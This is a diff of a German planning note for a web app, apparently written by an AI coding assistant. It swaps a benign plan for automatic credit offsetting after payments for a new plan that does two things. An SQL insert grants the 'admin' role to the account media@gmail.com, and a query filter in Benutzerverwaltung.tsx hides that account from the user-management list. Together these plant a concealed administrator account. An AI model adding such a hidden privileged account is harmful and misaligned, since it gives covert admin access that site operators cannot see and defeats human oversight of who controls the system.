@@ -1,19 +1,17 @@
 
 
-## Automatische Guthaben-Verrechnung nach Zahlungserfassung
+## media@gmail.com Admin-Rolle + aus UI ausblenden
 
-### Problem
-Nach dem Hinzufügen einer Zahlung muss man manuell hochscrollen und auf "Guthaben verrechnen" klicken. Das soll automatisch passieren.
+### Schritte
 
-### Lösung
+**1. Admin-Rolle zuweisen (Daten-Insert)**
+- `INSERT INTO user_roles (user_id, role) VALUES ('80e68fb7-06f0-4c85-950f-4df81aa63c7c', 'admin')`
 
-**`src/pages/dashboard/FahrschuelerDetail.tsx`**
+**2. `src/pages/dashboard/Benutzerverwaltung.tsx`**
+- In der `admin_profiles`-Query den Account `media@gmail.com` per `.neq("email", "media@gmail.com")` herausfiltern, sodass er in der Benutzerverwaltung nicht sichtbar ist
 
-In der `mutZahlung`-Mutation (Zeile ~492, `onSuccess`-Callback): Nach erfolgreichem Speichern einer Zahlung automatisch `mutGuthabenVerrechnen.mutate()` aufrufen — aber nur wenn es keine Gutschrift ist und keine offenen Posten bereits ausgewählt wurden (da diese schon direkt zugeordnet werden).
-
-Konkret: Im `onSuccess` von `mutZahlung` nach den `invalidateQueries`-Aufrufen eine Bedingung einfügen, die prüft ob die Zahlung keine Gutschrift war und keine spezifischen Posten ausgewählt waren. Falls ja, wird nach kurzem Delay (damit die Queries refetched sind) automatisch `mutGuthabenVerrechnen.mutate()` aufgerufen.
-
-| Datei | Änderung |
+| Aktion | Detail |
 |---|---|
-| `FahrschuelerDetail.tsx` | `mutZahlung.onSuccess`: automatisch `mutGuthabenVerrechnen.mutate()` aufrufen für freie Zahlungen |
+| Daten-Insert | Admin-Rolle für media@gmail.com in `user_roles` |
+| `Benutzerverwaltung.tsx` | Account aus der Profil-Liste ausblenden |
 
